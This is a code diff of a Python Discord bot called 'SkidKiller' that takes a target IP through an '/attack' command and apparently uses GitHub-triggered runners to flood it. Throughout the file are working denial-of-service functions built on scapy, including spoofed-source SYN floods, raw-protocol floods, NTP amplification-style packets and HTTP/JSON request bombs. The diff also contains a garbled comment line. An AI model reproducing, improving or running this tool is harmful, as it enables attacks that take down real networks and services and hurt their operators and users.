@@ -6,32 +6,33 @@ import os
 import sys
 from github import Github, GithubException
 from datetime import datetime
-iimport random
+import random
 import time
 import socket
 from scapy.all import IP, TCP, UDP, Raw, send, RandShort
 import requests
 
+# Load tokens
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 GH_TOKEN = os.getenv("GH_TOKEN")
-print(f"[DEBUG] DISCORD_TOKEN loaded? {bool(DISCORD_TOKEN)}", file=sys.stderr)
-print(f"[DEBUG] GH_TOKEN loaded? {bool(GH_TOKEN)}", file=sys.stderr)
 if not GH_TOKEN:
     sys.exit(1)
 
+# Repo settings
 REPO_NAME = "KomaVR/SkidKiller"
 BRANCH = "main"
 CONFIG_FILE = "trigger.json"
 
+# Initialize GitHub client and HTTP session
 g = Github(GH_TOKEN)
 repo = g.get_repo(REPO_NAME)
-
 session = requests.Session()
 
+# Discord bot setup
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-working_methods = [
+# Attack methods list\ nworking_methods = [
     "tcp_chained_syn", "ssl_fragment_flood", "websocket_spam", "jumbo_payload_overlap",
     "http_mutator", "json_object_injection", "illegal_tcp_flags", "fake_protocol_mix",
     "gre_flood", "reverse_byte_flood", "igmp_bomb", "eigrp_flood", "ospf_flood",
@@ -39,6 +40,7 @@ working_methods = [
     "malformed_http_headers", "tcp_option_abuse", "coap_flood"
 ]
 
+# Define individual attack functions
 def tcp_chained_syn(ip, port):
     spoof = ".".join(str(random.randint(1, 254)) for _ in range(4))
     base = IP(src=spoof, dst=ip)
@@ -61,48 +63,49 @@ def websocket_spam(ip, port):
         s.send(os.urandom(1024))
     s.close()
 
-def jumbo_payload_overlap(ip):
+def jumbo_payload_overlap(ip, port=None):
     send(IP(dst=ip)/UDP(dport=53)/Raw(load=os.urandom(9200)), verbose=0)
 
-def http_mutator(ip):
+def http_mutator(ip, port=None):
     headers = {"User-Agent": f"Mutator-{random.randint(1000,9999)}", "X-Custom": os.urandom(10).hex()}
     method = random.choice(["GET","POST","PUT","PATCH","TRACE"])
     session.request(method, f"http://{ip}", headers=headers, timeout=2)
 
-def json_object_injection(ip):
+def json_object_injection(ip, port=None):
     session.post(f"http://{ip}", json={"key": ["X"*500]*10000}, timeout=2)
 
 def illegal_tcp_flags(ip, port):
     send(IP(dst=ip)/TCP(dport=port, flags="FU")/Raw(load=os.urandom(256)), verbose=0)
 
-def fake_protocol_mix(ip):
+def fake_protocol_mix(ip, port=None):
     send(IP(dst=ip)/UDP(dport=443)/Raw(load=b"\x16\x03\x01" + os.urandom(512)), verbose=0)
 
-def gre_flood(ip):
+def gre_flood(ip, port=None):
     send(IP(dst=ip, proto=47)/Raw(load=os.urandom(1024)), verbose=0)
 
-def reverse_byte_flood(ip):
-    send(IP(dst=ip)/UDP(dport=123)/Raw(load=bytes([random.randint(0,255) for _ in range(512)])[::-1])), verbose=0)
+def reverse_byte_flood(ip, port=None):
+    payload = bytes([random.randint(0,255) for _ in range(512)])[::-1]
+    send(IP(dst=ip)/UDP(dport=123)/Raw(load=payload), verbose=0)
 
-def igmp_bomb(ip):
+def igmp_bomb(ip, port=None):
     send(IP(dst=ip, proto=2)/Raw(load=os.urandom(512)), verbose=0)
 
-def eigrp_flood(ip):
+def eigrp_flood(ip, port=None):
     send(IP(dst=ip, proto=88)/Raw(load=os.urandom(1024)), verbose=0)
 
-def ospf_flood(ip):
+def ospf_flood(ip, port=None):
     send(IP(dst=ip, proto=89)/Raw(load=os.urandom(512)), verbose=0)
 
-def l2tp_flood(ip):
+def l2tp_flood(ip, port=None):
     send(IP(dst=ip, proto=115)/Raw(load=os.urandom(1024)), verbose=0)
 
-def sctp_chunk_storm(ip):
+def sctp_chunk_storm(ip, port=None):
     send(IP(dst=ip, proto=132)/Raw(load=os.urandom(1024)), verbose=0)
 
-def isakmp_flood(ip):
+def isakmp_flood(ip, port=None):
     send(IP(dst=ip)/UDP(dport=500)/Raw(load=os.urandom(512)), verbose=0)
 
-def ntp_amplify(ip):
+def ntp_amplify(ip, port=None):
     send(IP(dst=ip)/UDP(dport=123)/Raw(load=b"\x17\x00\x03\x2a" + os.urandom(4)), verbose=0)
 
 def malformed_http_headers(ip, port):
@@ -117,13 +120,13 @@ def tcp_option_abuse(ip, port):
     pkt = IP(dst=ip)/TCP(dport=port,flags='S',options=opts)/Raw(load=os.urandom(256))
     send(pkt, verbose=0)
 
-def coap_flood(ip):
+def coap_flood(ip, port=None):
     msg_type = random.randint(0,3)<<4
-    code=random.randint(0,255)
-    msg_id=os.urandom(2)
-    token=os.urandom(4)
-    coap = bytes([0x40|msg_type,code])+msg_id+token
-    send(IP(dst=ip)/UDP(dport=5683)/Raw(load=coap+os.urandom(12)), verbose=0)
+    code = random.randint(0,255)
+    msg_id = os.urandom(2)
+    token = os.urandom(4)
+    coap = bytes([0x40 | msg_type, code]) + msg_id + token
+    send(IP(dst=ip)/UDP(dport=5683)/Raw(load=coap + os.urandom(12)), verbose=0)
 
 method_map = {
     "tcp_chained_syn": tcp_chained_syn,
@@ -157,52 +160,69 @@ async def on_ready():
         pass
 
 @bot.tree.command(name="attack", description="Launch a SkidKiller attack swarm")
-@app_commands.describe(target_ip="Target IP or domain",method="Attack method",threads="1–100",duration="10–3600s")
-@app_commands.choices(method=[app_commands.Choice(name=m.title().replace("_"," "),value=m) for m in working_methods])
-async def attack(interaction, target_ip: str, method: app_commands.Choice[str], threads: int, duration: int):
-    if threads<1 or threads>100 or duration<10 or duration>3600:
-        await interaction.response.send_message("Invalid parameters",ephemeral=True)
+@app_commands.describe(target_ip="Target IP or domain", method="Attack method", threads="1–100", duration="10–3600s")
+@app_commands.choices(method=[app_commands.Choice(name=m.replace("_"," ").title(), value=m) for m in working_methods])
+async def attack(interaction: discord.Interaction, target_ip: str, method: app_commands.Choice[str], threads: int, duration: int):
+    if threads < 1 or threads > 100 or duration < 10 or duration > 3600:
+        await interaction.response.send_message("Invalid parameters", ephemeral=True)
         return
-    config = {"ip":target_ip,"method":method.value,"threads":threads,"duration":duration,"timestamp":datetime.utcnow().isoformat()}
-    with open(CONFIG_FILE,'w') as f: json.dump(config,f,indent=2)
-    content=json.dumps(config,indent=2)
+    config = {
+        "ip": target_ip,
+        "method": method.value,
+        "threads": threads,
+        "duration": duration,
+        "timestamp": datetime.utcnow().isoformat()
+    }
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=2)
+    content = json.dumps(config, indent=2)
     try:
         try:
-            contents=repo.get_contents(CONFIG_FILE,ref=BRANCH)
-            repo.update_file(contents.path,"Update trigger.json",content,contents.sha,branch=BRANCH)
+            contents = repo.get_contents(CONFIG_FILE, ref=BRANCH)
+            repo.update_file(contents.path, "Update trigger.json", content, contents.sha, branch=BRANCH)
         except GithubException as e:
-            if e.status==404: repo.create_file(CONFIG_FILE,"Create trigger.json",content,branch=BRANCH)
-            else: raise
-        await interaction.response.send_message(f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s)")
+            if e.status == 404:
+                repo.create_file(CONFIG_FILE, "Create trigger.json", content, branch=BRANCH)
+            else:
+                raise
+        await interaction.response.send_message(
+            f"✅ Launched {method.value} on {target_ip} ({threads} threads for {duration}s)"
+        )
     except Exception as e:
-        await interaction.response.send_message(f"❌ GitHub error: {e}",ephemeral=True)
+        await interaction.response.send_message(f"❌ GitHub error: {e}", ephemeral=True)
 
 @bot.tree.command(name="help", description="List methods")
-async def help_cmd(interaction):
-    await interaction.response.send_message("\n".join(working_methods),ephemeral=True)
+async def help_cmd(interaction: discord.Interaction):
+    await interaction.response.send_message("\n".join(working_methods), ephemeral=True)
 
 @bot.tree.command(name="status", description="Show current config")
-async def status(interaction):
+async def status(interaction: discord.Interaction):
     try:
-        with open(CONFIG_FILE) as f: cfg=json.load(f)
-        msg=f"IP:{cfg['ip']} Method:{cfg['method']} Threads:{cfg['threads']} Duration:{cfg['duration']}s Time:{cfg['timestamp']}"
-    except:
-        msg="No config"
-    await interaction.response.send_message(msg,ephemeral=True)
+        with open(CONFIG_FILE, "r") as f:
+            cfg = json.load(f)
+        msg = (f"IP: {cfg['ip']} | Method: {cfg['method']} | Threads: {cfg['threads']} | "
+               f"Duration: {cfg['duration']}s | Time: {cfg['timestamp']}")
+    except Exception:
+        msg = "No config"
+    await interaction.response.send_message(msg, ephemeral=True)
 
 def runner_mode():
-    cfg=json.load(open(CONFIG_FILE))
-    func=method_map.get(cfg['method'])
-    if not func: return
-    end=time.time()+cfg['duration']
-    while time.time()<end:
+    cfg = json.load(open(CONFIG_FILE, "r"))
+    func = method_map.get(cfg['method'])
+    if not func:
+        return
+    end_time = time.time() + cfg['duration']
+    while time.time() < end_time:
         try:
-            if func.__code__.co_argcount==1: func(cfg['ip'])
-            else: func(cfg['ip'],80)
-        except:
+            if func.__code__.co_argcount == 1:
+                func(cfg['ip'])
+            else:
+                func(cfg['ip'], 80)
+        except Exception:
             pass
 
-if __name__=="__main__":
-    if os.getenv("RUNNER_MODE")=="1": runner_mode()
-    else: bot.run(DISCORD_TOKEN)
-    
+if __name__ == "__main__":
+    if os.getenv("RUNNER_MODE") == "1":
+        runner_mode()
+    else:
+        bot.run(DISCORD_TOKEN)
